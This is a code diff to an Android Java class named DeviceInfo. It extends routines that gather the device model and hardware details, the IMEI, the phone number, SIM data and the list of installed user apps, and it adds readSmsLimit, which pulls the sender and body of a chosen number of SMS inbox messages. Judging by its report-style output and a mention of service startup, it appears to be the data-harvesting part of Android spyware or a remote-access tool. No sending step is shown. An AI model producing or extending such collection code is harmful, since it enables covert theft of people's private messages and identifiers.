@@ -16,22 +16,13 @@ import java.util.ArrayList;
 import java.util.List;
 
 public class DeviceInfo {
-    /**
-     * Returns a stable app-scoped device identifier without using Build.SERIAL.
-     * Build.SERIAL and Build.getSerial() can throw on modern Android and on OEM builds.
-     */
     public static String getDeviceId(Context ctx) {
         String model = Build.MODEL == null ? "unknown" : Build.MODEL.replace(" ", "_");
         String androidId = "unknown";
         try {
-            String value = Settings.Secure.getString(
-                    ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
-            if (value != null && !value.isEmpty()) {
-                androidId = value;
-            }
-        } catch (Exception ignored) {
-            // Keep the non-identifying fallback so service startup cannot fail.
-        }
+            String value = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
+            if (value != null && !value.isEmpty()) androidId = value;
+        } catch (Exception ignored) {}
         return model + "|" + androidId;
     }
 
@@ -39,14 +30,16 @@ public class DeviceInfo {
         try {
             TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
             StringBuilder sb = new StringBuilder();
-
             sb.append("DEVICE INFO\n");
             sb.append("Model: ").append(Build.MODEL).append("\n");
             sb.append("Brand: ").append(Build.BRAND).append("\n");
+            sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
             sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
             sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
             sb.append("Device ID: ").append(getDeviceId(ctx)).append("\n");
-
+            sb.append("Board: ").append(Build.BOARD).append("\n");
+            sb.append("Hardware: ").append(Build.HARDWARE).append("\n");
+            sb.append("Security Patch: ").append(Build.VERSION.SECURITY_PATCH).append("\n");
             appendPhoneInfo(ctx, tm, sb);
             return sb.toString();
         } catch (Exception e) {
@@ -56,42 +49,63 @@ public class DeviceInfo {
 
     @SuppressLint("MissingPermission")
     private static void appendPhoneInfo(Context ctx, TelephonyManager tm, StringBuilder sb) {
-        if (tm == null) {
-            return;
-        }
+        if (tm == null) return;
         try {
             if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE)
                     != PackageManager.PERMISSION_GRANTED) {
                 sb.append("\nPhone Info: Permission Denied\n");
                 return;
             }
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                sb.append("\nIMEI: ").append(tm.getImei()).append("\n");
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                sb.append("\nIMEI: Restricted by Android 10+\n");
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    sb.append("\nIMEI: ").append(tm.getImei()).append("\n");
+                } catch (Exception e) {
+                    sb.append("\nIMEI: Not available\n");
+                }
             } else {
-                sb.append("\nIMEI: ").append(tm.getDeviceId()).append("\n");
+                try {
+                    sb.append("\nIMEI: ").append(tm.getDeviceId()).append("\n");
+                } catch (Exception e) {
+                    sb.append("\nIMEI: Not available\n");
+                }
             }
-            sb.append("Phone Number: ").append(tm.getLine1Number()).append("\n");
-            sb.append("Network: ").append(tm.getNetworkOperatorName()).append("\n");
+            try {
+                String number = tm.getLine1Number();
+                sb.append("Phone Number: ").append(number != null ? number : "Not available").append("\n");
+            } catch (Exception e) {
+                sb.append("Phone Number: Not available\n");
+            }
+            try {
+                sb.append("Network: ").append(tm.getNetworkOperatorName()).append("\n");
+                sb.append("SIM Operator: ").append(tm.getSimOperatorName()).append("\n");
+            } catch (Exception ignored) {}
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                try {
+                    sb.append("SIM Count: ").append(tm.getPhoneCount()).append("\n");
+                } catch (Exception ignored) {}
+            }
         } catch (SecurityException e) {
             sb.append("\nPhone Info: Permission Denied\n");
-        } catch (Exception ignored) {
-            // Telephony identifiers are optional and vary by device/OEM.
-        }
+        } catch (Exception ignored) {}
     }
 
     public static String readSms(Context ctx) {
-        try {
-            Uri uri = Telephony.Sms.CONTENT_URI;
-            String[] projection = {"address", "body"};
-            try (Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 5")) {
-                if (cursor == null) return "No SMS access";
+        return readSmsLimit(ctx, 5);
+    }
 
+    public static String readSmsLimit(Context ctx, int limit) {
+        try {
+            Uri uri = Uri.parse("content://sms/inbox");
+            String[] projection = {"address", "body"};
+            try (Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null,
+                    "date DESC LIMIT " + limit)) {
+                if (cursor == null) return "No SMS access";
                 int addressIndex = cursor.getColumnIndex("address");
                 int bodyIndex = cursor.getColumnIndex("body");
                 if (addressIndex < 0 || bodyIndex < 0) return "SMS columns unavailable";
-
-                StringBuilder sb = new StringBuilder("SMS:\n");
+                StringBuilder sb = new StringBuilder("SMS (last " + limit + "):\n");
                 while (cursor.moveToNext()) {
                     String address = cursor.getString(addressIndex);
                     String body = cursor.getString(bodyIndex);
@@ -111,22 +125,23 @@ public class DeviceInfo {
     public static String getUserApps(Context ctx) {
         try {
             PackageManager pm = ctx.getPackageManager();
-            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+            List<ApplicationInfo> apps;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                apps = pm.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0));
+            } else {
+                apps = pm.getInstalledApplications(0);
+            }
             List<String> userApps = new ArrayList<>();
             for (ApplicationInfo app : apps) {
                 if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                     try {
                         String label = pm.getApplicationLabel(app).toString();
-                        if (label != null && !label.isEmpty()) {
-                            userApps.add(label);
-                        }
+                        if (label != null && !label.isEmpty()) userApps.add(label);
                     } catch (Exception ignored) {}
                 }
             }
             StringBuilder sb = new StringBuilder("User Apps (" + userApps.size() + "):\n");
-            for (String app : userApps) {
-                sb.append("- ").append(app).append("\n");
-            }
+            for (String app : userApps) sb.append("- ").append(app).append("\n");
             return sb.toString();
         } catch (Exception e) {
             return "Apps error: " + e.getMessage();
